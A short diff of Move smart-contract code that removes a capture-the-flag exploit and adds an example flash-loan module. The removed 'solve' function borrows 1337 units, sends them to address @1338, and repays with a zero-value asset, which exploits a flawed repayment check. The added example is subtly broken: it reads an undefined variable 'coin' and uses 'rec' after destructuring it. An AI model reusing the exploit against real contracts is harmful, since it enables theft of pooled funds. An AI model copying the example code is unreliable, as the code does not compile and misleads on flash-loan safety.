@@ -1,13 +1,20 @@
-module solution::exploit {
-    use challenge::flash;
-    use aptos_framework::primary_fungible_store;
-    use aptos_framework::fungible_asset;
-
-    public entry fun solve(account: &signer) {
-        let fa = flash::flash_loan(account, 1337);
-        let metadata = fungible_asset::asset_metadata(&fa);
-        let zero = fungible_asset::zero(metadata);
-        primary_fungible_store::deposit(@1338, fa);  
-        flash::repay(account, zero);
-    }
+module 0x42::example {
+  struct Coin<T> {
+    amount: u64
+  }
+ 
+  struct Receipt {
+    amount: u64
+  }
+ 
+  public fun flash_loan<T>(user: &signer, amount: u64): (Coin<T>, Receipt) {
+    let (coin, fee) = withdraw(user, amount);
+    ( coin, Receipt {amount: amount + fee} )
+  }
+ 
+  public fun repay_flash_loan<T>(rec: Receipt, coins: Coin<T>) {
+    let Receipt{ amount } = rec;
+    assert!(coin::value<T>(&coin) >= rec.amount, 0);
+    deposit(coin);
+  }
 }
